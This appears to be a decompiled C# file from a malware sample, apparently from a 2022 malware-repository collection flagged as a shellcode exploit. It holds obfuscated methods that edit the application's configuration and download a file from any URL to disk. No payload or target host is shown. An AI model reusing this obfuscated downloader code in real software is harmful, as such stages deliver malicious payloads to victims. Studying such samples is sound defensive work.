// Decompiled with JetBrains decompiler
// Type: 503062988578.723284698795
// Assembly: 190180155270, Version=7.6.1.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35
// MVID: 20B0A582-54C5-4C64-BCB9-2AC73608F590
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-211b9bdeb7639f8b1f0606b7671a4d1fdbf246968b078ff103eac9aa4c2cd108.exe

using \u003095645755338;
using System;
using System.Configuration;
using System.IO;
using System.Net;

namespace \u003503062988578
{
  public static class \u003723284698795
  {
    public static void \u003908129480605(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        throw new ArgumentNullException("key");
      System.Configuration.Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
      configuration.AppSettings.Settings[_param0].Value = _param1;
      configuration.Save(ConfigurationSaveMode.Modified);
      ConfigurationManager.RefreshSection("appSettings");
    }

    public static void \u003189367051361(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        return;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.UserAgent = \u003019388442816.\u003342556464675;
      httpWebRequest.AllowAutoRedirect = true;
      httpWebRequest.KeepAlive = false;
      int totalMilliseconds = (int) TimeSpan.FromMinutes(10.0).TotalMilliseconds;
      httpWebRequest.Timeout = totalMilliseconds;
      httpWebRequest.ReadWriteTimeout = totalMilliseconds;
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          if (responseStream == null)
            return;
          using (FileStream fileStream = new FileStream(_param1, FileMode.Create, FileAccess.Write, FileShare.None))
          {
            byte[] buffer = new byte[8192];
            int length = buffer.Length;
            int count;
            while ((count = responseStream.Read(buffer, 0, length)) > 0)
            {
              fileStream.Write(buffer, 0, count);
              fileStream.Flush();
            }
          }
        }
      }
    }
  }
}
